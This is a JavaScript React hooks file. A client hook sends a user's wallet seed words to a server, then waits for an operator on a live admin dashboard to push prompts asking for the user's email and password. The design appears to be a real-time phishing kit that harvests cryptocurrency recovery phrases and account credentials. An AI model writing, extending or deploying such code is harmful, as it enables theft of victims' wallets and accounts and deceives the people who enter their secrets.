import { useState, useEffect, useRef } from 'react'
import pusher from '../services/pusher'

export function useSession() {
  const [sessionId, setSessionId] = useState(null)
  const [status, setStatus] = useState('idle')
  const [channel, setChannel] = useState(null)
  const [error, setError] = useState(null)
  const [loading, setLoading] = useState(false)

  const channelRef = useRef(null)

  const createSession = async (seedWords) => {
    setLoading(true)
    setError(null)

    try {
      const response = await fetch('/api/sessions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          seedWords,
          clientId: crypto.randomUUID()
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || 'Failed to create session')
      }

      const { sessionId: newSessionId, channel: channelName, status: sessionStatus } = data
      
      setSessionId(newSessionId)
      setStatus(sessionStatus)

      // Subscribe to session channel
      const sessionChannel = pusher.subscribe(channelName)
      setChannel(sessionChannel)
      channelRef.current = sessionChannel

      // Listen for admin actions
      sessionChannel.bind('request-email', () => {
        setStatus('awaiting-email')
      })

      sessionChannel.bind('request-password', () => {
        setStatus('awaiting-password')
      })

      sessionChannel.bind('finalized', () => {
        setStatus('finalized')
      })

      return newSessionId

    } catch (error) {
      console.error('Failed to create session:', error)
      setError(error.message)
      throw error
    } finally {
      setLoading(false)
    }
  }

  const submitEmail = async (email) => {
    if (!sessionId) {
      throw new Error('No session found')
    }

    setLoading(true)
    setError(null)

    try {
      const response = await fetch('/api/submit-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId,
          email
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || 'Failed to submit email')
      }

      return data

    } catch (error) {
      console.error('Failed to submit email:', error)
      setError(error.message)
      throw error
    } finally {
      setLoading(false)
    }
  }

  const submitPassword = async (password) => {
    if (!sessionId) {
      throw new Error('No session found')
    }

    setLoading(true)
    setError(null)

    try {
      const response = await fetch('/api/submit-password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId,
          password
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || 'Failed to submit password')
      }

      return data

    } catch (error) {
      console.error('Failed to submit password:', error)
      setError(error.message)
      throw error
    } finally {
      setLoading(false)
    }
  }

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (channelRef.current) {
        pusher.unsubscribe(channelRef.current.name)
      }
    }
  }, [])

  return {
    sessionId,
    status,
    error,
    loading,
    createSession,
    submitEmail,
    submitPassword
  }
}

export function useAdminDashboard() {
  const [sessions, setSessions] = useState([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState(null)

  useEffect(() => {
    // Load initial sessions
    const loadSessions = async () => {
      try {
        const response = await fetch('/api/admin/sessions')
        const data = await response.json()
        
        if (response.ok) {
          setSessions(data.sessions)
        } else {
          setError(data.error)
        }
      } catch (error) {
        console.error('Failed to load sessions:', error)
        setError(error.message)
      } finally {
        setLoading(false)
      }
    }

    loadSessions()

    // Subscribe to admin channel
    const adminChannel = pusher.subscribe('admin-channel')

    // Listen for new sessions
    adminChannel.bind('new-session', (session) => {
      setSessions(prev => [session, ...prev])
    })

    // Listen for session updates
    adminChannel.bind('session-updated', (updatedSession) => {
      setSessions(prev => prev.map(session => 
        session.sessionId === updatedSession.sessionId 
          ? updatedSession 
          : session
      ))
    })

    return () => {
      pusher.unsubscribe('admin-channel')
    }
  }, [])

  const requestEmail = async (sessionId) => {
    try {
      const response = await fetch('/api/admin/request-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ sessionId }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || 'Failed to request email')
      }

      return data

    } catch (error) {
      console.error('Failed to request email:', error)
      throw error
    }
  }

  return {
    sessions,
    loading,
    error,
    requestEmail
  }
}